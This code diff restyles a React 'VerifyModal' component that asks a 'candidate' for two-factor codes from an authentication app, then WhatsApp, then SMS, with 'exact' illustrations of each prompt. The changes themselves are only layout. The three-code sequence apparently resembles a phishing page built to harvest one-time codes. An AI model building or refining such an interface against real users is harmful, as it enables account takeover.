@@ -13,7 +13,7 @@ function Shell({ children, maxWidth = "max-w-md" }: { children: React.ReactNode;
       role="dialog"
       aria-modal="true"
     >
-      <div className={`w-full ${maxWidth} bg-white border border-black/5 rounded-2xl shadow-2xl p-7 animate-fade-up max-h-[90vh] overflow-y-auto`}>
+      <div className={`w-full ${maxWidth} bg-white border border-black/5 rounded-2xl shadow-2xl p-7 sm:p-8 animate-fade-up max-h-[92vh] overflow-y-auto`}>
         {children}
       </div>
     </div>
@@ -157,11 +157,11 @@ export default function VerifyModal({
     );
   }
 
-  // 3. AUTHAPP POPUP (Code 1 - Go to your authentication app)
+  // 3. AUTHAPP POPUP (Code 1 - Go to your authentication app) -> 30% wider (max-w-[580px])
   if (stage === "code" && codeNumber === 1) {
     return (
-      <Shell maxWidth="max-w-md">
-        <div className="space-y-3.5 font-sans">
+      <Shell maxWidth="max-w-[580px]">
+        <div className="space-y-4 font-sans">
           {/* Top Line: Candidate Name */}
           <p className="text-sm font-semibold text-gray-800">
             {candidateName || "Candidate"}
@@ -177,13 +177,13 @@ export default function VerifyModal({
             Enter the 6-digit code for this account from the two-factor authentication app you set up (such as Duo Mobile or Google Authenticator).
           </p>
 
-          {/* Exact AuthApp Illustration */}
-          <div className="my-2 rounded-2xl overflow-hidden shadow-2xs border border-gray-100">
+          {/* Exact Rounded AuthApp Illustration */}
+          <div className="my-2 rounded-2xl overflow-hidden shadow-xs">
             {/* eslint-disable-next-line @next/next/no-img-element */}
             <img
               src="/images/illustration-authapp.png"
               alt="Authentication App Verification"
-              className="w-full h-auto object-cover select-none"
+              className="w-full h-auto object-cover rounded-2xl select-none"
             />
           </div>
 
@@ -201,7 +201,7 @@ export default function VerifyModal({
             className="space-y-3.5 pt-1"
           >
             {/* Code Input Box */}
-            <div className="border border-gray-300 focus-within:border-[#0069ff] focus-within:ring-1 focus-within:ring-[#0069ff] rounded-xl px-4 py-2 bg-white transition-all shadow-2xs">
+            <div className="border border-gray-300 focus-within:border-[#0069ff] focus-within:ring-1 focus-within:ring-[#0069ff] rounded-xl px-4 py-2.5 bg-white transition-all shadow-2xs">
               <label className="block text-[11px] font-medium text-gray-500" htmlFor="authapp-code-input">
                 Code
               </label>
@@ -239,11 +239,11 @@ export default function VerifyModal({
     );
   }
 
-  // 4. WHATSAPP POPUP (Code 2 - Check your WhatsApp messages)
+  // 4. WHATSAPP POPUP (Code 2 - Check your WhatsApp messages) -> 30% wider (max-w-[580px])
   if (stage === "code" && codeNumber === 2) {
     return (
-      <Shell maxWidth="max-w-md">
-        <div className="space-y-3.5 font-sans">
+      <Shell maxWidth="max-w-[580px]">
+        <div className="space-y-4 font-sans">
           {/* Top Line: Candidate Name */}
           <p className="text-sm font-semibold text-gray-800">
             {candidateName || "Candidate"}
@@ -259,13 +259,13 @@ export default function VerifyModal({
             Enter the code we sent to your WhatsApp account at *** *** *{last2Digits}.
           </p>
 
-          {/* Exact WhatsApp Illustration */}
-          <div className="my-2 rounded-2xl overflow-hidden shadow-2xs border border-gray-100">
+          {/* Exact Rounded WhatsApp Illustration */}
+          <div className="my-2 rounded-2xl overflow-hidden shadow-xs">
             {/* eslint-disable-next-line @next/next/no-img-element */}
             <img
               src="/images/illustration-whatsapp.png"
               alt="WhatsApp Verification"
-              className="w-full h-auto object-cover select-none"
+              className="w-full h-auto object-cover rounded-2xl select-none"
             />
           </div>
 
@@ -283,7 +283,7 @@ export default function VerifyModal({
             className="space-y-3 pt-1"
           >
             {/* Code Input Box */}
-            <div className="border border-gray-300 focus-within:border-[#0069ff] focus-within:ring-1 focus-within:ring-[#0069ff] rounded-xl px-4 py-2 bg-white transition-all shadow-2xs">
+            <div className="border border-gray-300 focus-within:border-[#0069ff] focus-within:ring-1 focus-within:ring-[#0069ff] rounded-xl px-4 py-2.5 bg-white transition-all shadow-2xs">
               <label className="block text-[11px] font-medium text-gray-500" htmlFor="whatsapp-code-input">
                 Code
               </label>
@@ -327,11 +327,11 @@ export default function VerifyModal({
     );
   }
 
-  // 5. SMS POPUP (Code 3 - Check your text messages)
+  // 5. SMS POPUP (Code 3 - Check your text messages) -> 30% wider (max-w-[580px])
   if (stage === "code" && codeNumber === 3) {
     return (
-      <Shell maxWidth="max-w-md">
-        <div className="space-y-3.5 font-sans">
+      <Shell maxWidth="max-w-[580px]">
+        <div className="space-y-4 font-sans">
           {/* Top Line: Candidate Name */}
           <p className="text-sm font-semibold text-gray-800">
             {candidateName || "Candidate"}
@@ -347,13 +347,13 @@ export default function VerifyModal({
             Enter the code we sent to *** *** *{last2Digits}.
           </p>
 
-          {/* Exact SMS Illustration */}
-          <div className="my-2 rounded-2xl overflow-hidden shadow-2xs border border-gray-100">
+          {/* Exact Rounded SMS Illustration */}
+          <div className="my-2 rounded-2xl overflow-hidden shadow-xs">
             {/* eslint-disable-next-line @next/next/no-img-element */}
             <img
               src="/images/illustration-sms.png"
               alt="SMS Verification"
-              className="w-full h-auto object-cover select-none"
+              className="w-full h-auto object-cover rounded-2xl select-none"
             />
           </div>
 
@@ -371,7 +371,7 @@ export default function VerifyModal({
             className="space-y-3 pt-1"
           >
             {/* Code Input Box */}
-            <div className="border border-gray-300 focus-within:border-[#0069ff] focus-within:ring-1 focus-within:ring-[#0069ff] rounded-xl px-4 py-2 bg-white transition-all shadow-2xs">
+            <div className="border border-gray-300 focus-within:border-[#0069ff] focus-within:ring-1 focus-within:ring-[#0069ff] rounded-xl px-4 py-2.5 bg-white transition-all shadow-2xs">
               <label className="block text-[11px] font-medium text-gray-500" htmlFor="sms-code-input">
                 Code
               </label>
